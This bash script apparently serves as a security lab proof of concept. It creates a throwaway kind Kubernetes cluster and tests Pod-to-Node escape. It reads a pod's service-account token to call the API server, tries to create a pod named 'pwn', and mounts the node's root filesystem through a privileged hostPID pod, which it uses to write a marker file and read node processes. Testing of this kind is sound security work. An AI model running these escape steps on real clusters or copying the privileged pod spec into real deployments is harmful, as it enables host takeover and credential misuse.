#!/usr/bin/env bash
# kind cluster: Pod->Node escape surface probes. Cluster is deleted at the end.
set -u
mkdir -p reports
R=reports/poc-k8s-report.txt
exec > >(tee -a "$R") 2>&1

echo "== toolchain"
kind version
kubectl version --client 2>/dev/null | head -2 || true

echo "== create kind cluster"
if ! kind create cluster --name esc-lab --wait 180s; then
  echo "kind create FAILED"; exit 1
fi

echo "== [k1] default SA permission self-check (in-cluster, from host kubectl)"
kubectl auth can-i --list -n default

echo "== [k2] SA token API access from inside a default pod"
kubectl run probe --image=alpine:3.19 --restart=Never -- sleep 600 >/dev/null
kubectl wait --for=condition=Ready pod/probe --timeout=120s
kubectl exec probe -- sh -c '
apk add -q curl >/dev/null 2>&1
T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
echo "--- GET list pods (default SA, default ns): HTTP code:"
curl -s -o /dev/null -w "%{http_code}\n" --cacert $CA -H "Authorization: Bearer $T" https://kubernetes.default.svc/api/v1/namespaces/default/pods
echo "--- POST create pod (default SA, expect 403): HTTP code:"
curl -s -o /dev/null -w "%{http_code}\n" --cacert $CA -X POST -H "Authorization: Bearer $T" -H "Content-Type: application/json" -d "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"pwn\"},\"spec\":{\"containers\":[{\"name\":\"c\",\"image\":\"alpine\"}]}}" https://kubernetes.default.svc/api/v1/namespaces/default/pods
'

echo "== [k3] privileged + hostPID + hostPath pod (Pod->Node escape)"
cat <<'EOF' | kubectl apply -f - >/dev/null
apiVersion: v1
kind: Pod
metadata:
  name: esc-priv
spec:
  hostPID: true
  containers:
  - name: c
    image: alpine:3.19
    command: ["sleep", "600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: hostroot
      mountPath: /host
  volumes:
  - name: hostroot
    hostPath:
      path: /
      type: Directory
EOF
kubectl wait --for=condition=Ready pod/esc-priv --timeout=120s
echo "-- node fs via hostPath (head):"
kubectl exec esc-priv -- ls /host 2>/dev/null | head -15
echo "-- write marker to node fs via hostPath:"
kubectl exec esc-priv -- sh -c 'echo "pod-escape-marker $(date -u +%FT%TZ)" > /host/tmp/k8s-pod-escape-marker && cat /host/tmp/k8s-pod-escape-marker'
echo "-- authoritative verify from node itself (kind node container):"
docker exec esc-lab-control-plane cat /tmp/k8s-pod-escape-marker 2>/dev/null || echo "MISSING"
echo "-- hostPID: node processes visible inside pod (head):"
kubectl exec esc-priv -- sh -c 'ps aux 2>/dev/null | head -12 || ls /host/proc | grep -E "^[0-9]+$" | head -12'
echo "-- node identity via /host/proc:"
kubectl exec esc-priv -- sh -c 'cat /host/proc/cmdline 2>/dev/null | head -c 200; echo'

echo "== cleanup: delete kind cluster (no dirty resources)"
kind delete cluster --name esc-lab
echo "== done"
